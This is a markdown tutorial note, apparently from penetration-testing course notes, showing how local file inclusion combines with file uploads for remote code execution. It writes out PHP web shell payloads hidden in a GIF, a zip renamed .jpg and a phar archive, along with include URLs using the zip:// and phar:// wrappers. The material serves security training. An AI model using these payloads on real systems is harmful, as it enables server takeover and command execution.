---
title: c-LFI and File Uploads
draft: false
tags:
  - lfi
---
> We can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.

As mentioned in the first section, the following are the functions that allow executing code with file inclusion, any of which would work with this section's attacks:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

## Image Upload

### Craft Malicious Image

Let's create a malicious `gif` file as such:

```shell-session
jadu101@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

> **Note:** We are using a `GIF` image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type.


Now we go to `Profile Settings` and click on the avatar image to select and upload our malicious image. 

### Uploaded File Path

Once we've uploaded our file, all we need to do is include it through the LFI vulnerability.

Let's inspect the source code after uploading the image. 

We can get its upload URL:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

With the uploaded file path at hand, all we need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed, as follows:

```URL
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```


## Zip Upload

There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal. These techniques may become handy in some specific cases where the above technique does not work.

 We can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:
 
```shell-session
jadu101@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

> **Note:** Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.

Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded). Finally, we can execute commands as we always do with `&cmd=id`, as follows:

```URL
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

## Phar Upload

Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:

```shell-session
jadu101@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Once we upload it to the web application, we can simply call it with `phar://`:

```URL
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

> **Note:** There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the `phpinfo()` page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to [This Link](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo).


